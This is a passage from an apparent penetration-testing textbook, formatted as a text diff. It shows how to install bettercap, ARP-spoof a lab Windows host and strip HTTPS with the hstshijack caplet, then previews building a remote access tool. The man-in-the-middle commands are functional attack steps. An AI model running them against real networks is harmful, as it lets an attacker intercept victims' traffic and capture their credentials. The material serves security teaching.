+    to work properly. It can be found at [https://github.com/bettercap/bettercap/releases/download/v2.23/bettercap_linux_amd64_2.23.zip](https://github.com/bettercap/bettercap/releases/download/v2.23/bettercap_linux_amd64_2.23.zip).
+  prefs: []
+  type: TYPE_NORMAL
+- en: Download this tool and run it on Linux.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Once you've downloaded it, put this zipped file in your desired location on
+    Kali Linux and extract the module. You will see an executable named **bettercap**.
+    You could directly run this executable and it would work just fine. However, I
+    recommend putting this in the **/usr/bin/** directory so that you can access it
+    from anywhere, so copy this file into **/usr/bin/**.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'To copy the file, use the following command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: sudo cp bettercap /usr/bin/bettercap
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Once copied, simply open a Terminal and type **bettercap** to run the file.
+    Before proceeding, we need to do a couple of things to start it. Write the following
+    command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: sudo bettercap
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The interface will look like this:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 5.18 – bettercap version'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_05_18.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 5.18 – bettercap version
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Next, you need to update a couple of things; that is, some internal files for
+    this module called caplets. Don''t worry – you don''t need to understand much
+    about caplets here. Just write the following commands and let the magic happen:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: caplets.update
+  prefs: []
+  type: TYPE_NORMAL
+- en: This will download some files and update them.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Exit this program to let the changes take place. Now, let''s run the program
+    again with the following command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: sudo bettercap –-silent -iface eth0
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'This command will run **bettercap** in silent mode while using **eth0** as
+    its main network interface. To see which devices are available on the network,
+    you can type in the following command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: net.probe on
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The output of this command will look something like this:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 5.19 – Live hosts on the network'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_05_19.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 5.19 – Live hosts on the network
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Let''s try to use the internal **arpspoof** program for this application. Type
+    in the following command to set up **arp** spoofing for our Windows machine:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: set arp.spoof.targets 192.168.74.129
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'This will set up the victim. To start the **arp** spoofing program, we can
+    write the following command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: set arp.spoof.internal true
+  prefs: []
+  type: TYPE_NORMAL
+- en: set arp.spoof on
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'This will start spoofing the devices:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 5.20 – Device spoofing'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_05_20.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 5.20 – Device spoofing
+  prefs: []
+  type: TYPE_NORMAL
+- en: At this point, we've come to the **SSL** stripping part. To start stripping
+    the HTTPS traffic, we need to go to the Windows machine and clear all browsing
+    history. This will ensure that we don't load the cached versions of the websites.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'If you want to see what services are running on **bettercap**, you can use
+    the following **help** command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 5.21 – Help command'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_05_21.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 5.21 – Help command
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Next, to see the raw HTTP traffic, run the following command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: hstshijack/hstshijack
+  prefs: []
+  type: TYPE_NORMAL
+- en: This will start stripping the traffic. Now, if you go to the Windows machine
+    and go to a website such as [google.com](http://google.com), you will see that
+    the website connection is unsecure. If you go to [google.com](http://google.com),
+    you will notice a *Not secure* tag before the URL.
+  prefs: []
+  type: TYPE_NORMAL
+- en: You should now have an unsecure version of Google. If you go to your Kali Linux
+    terminal where **bettercap** is running, you should see the network traffic.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Attention!
+  prefs: []
+  type: TYPE_NORMAL
+- en: Note that big companies such as Google, Facebook, and so on spend huge amounts
+    of money on their security and are constantly trying to improve their protection
+    methods, so one attack that works today might not work tomorrow. That is why penetration
+    testers and cyber security defense teams are constantly involved in a chasing
+    game. The goal of the previous example is to show how these methods work in practice.
+    By the time you use it for yourself, things might have changed and this attack
+    method may or may not work. It is important to stay updated. The purpose of this
+    book is not to get you get stuck on using specific tools but to show you the way
+    penetration testers and security analysts think.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Summary
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: In this chapter, we built on the knowledge we learned about in the previous
+    chapter and used it to build an ARP spoof program, which enabled us to intercept
+    traffic on a local network. Then, we learned how the HTTP and HTTPS protocols
+    work and how they can be broken by man in the middle attacks.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'In next chapter, we will look at a more exciting topic: malware development.
+    This can help us manually take charge of a victim''s machine and perform certain
+    tasks on it. By doing so, we will learn how to build a malware **Remote Access
+    Tool** to take control of the victim''s computer. We will build a program that
+    will enable us to remotely take control of the victim''s machine and perform several
+    tasks on it. See you in the next chapter!'
+  prefs: []
+  type: TYPE_NORMAL
